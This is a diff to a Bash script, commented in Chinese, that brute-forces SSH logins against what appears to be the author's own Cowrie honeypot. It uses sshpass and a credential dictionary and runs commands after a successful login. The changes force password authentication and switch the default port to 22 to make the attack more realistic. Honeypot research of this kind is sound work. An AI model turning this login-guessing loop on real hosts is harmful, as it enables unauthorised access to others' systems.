@@ -9,7 +9,7 @@ set -u  # 遇到未定义变量时退出
 
 # ==================== 配置区 ====================
 HONEYPOT_IP="${1:-192.168.122.123}"   # 蜜罐 IP，支持命令行参数
-HONEYPOT_PORT="${2:-2222}"            # 蜜罐端口
+HONEYPOT_PORT="${2:-22}"              # 蜜罐端口（VPS 上 Cowrie 占 22；旧 VirtualBox 环境传 2222）
 CREDS_FILE="./payloads/common_creds.txt"  # 凭据字典
 LOG_DIR="./logs"                      # 本地日志目录
 ATTACK_LOG="$LOG_DIR/attack_$(date +%Y%m%d_%H%M%S).log"  # 攻击日志
@@ -109,11 +109,15 @@ try_login() {
     # 使用 sshpass 尝试登录（设置 5 秒超时）
     # StrictHostKeyChecking=no 跳过主机密钥验证
     # UserKnownHostsFile=/dev/null 不保存主机密钥
+    # 不要加 BatchMode=yes：它会禁用密码提示，sshpass 就无法喂入密码，导致每次都失败
+    # 强制走密码认证、关掉公钥、只提示一次，行为确定且贴近真实爆破
     if timeout 10 sshpass -p "$password" ssh \
         -o StrictHostKeyChecking=no \
         -o UserKnownHostsFile=/dev/null \
         -o ConnectTimeout=5 \
-        -o BatchMode=yes \
+        -o PreferredAuthentications=password \
+        -o PubkeyAuthentication=no \
+        -o NumberOfPasswordPrompts=1 \
         -p "$HONEYPOT_PORT" \
         "$username@$HONEYPOT_IP" \
         "echo 'LOGIN_SUCCESS'" 2>/dev/null | grep -q "LOGIN_SUCCESS"; then
@@ -151,6 +155,9 @@ execute_commands() {
             -o StrictHostKeyChecking=no \
             -o UserKnownHostsFile=/dev/null \
             -o ConnectTimeout=5 \
+            -o PreferredAuthentications=password \
+            -o PubkeyAuthentication=no \
+            -o NumberOfPasswordPrompts=1 \
             -p "$HONEYPOT_PORT" \
             "$username@$HONEYPOT_IP" \
             "$cmd" 2>&1)
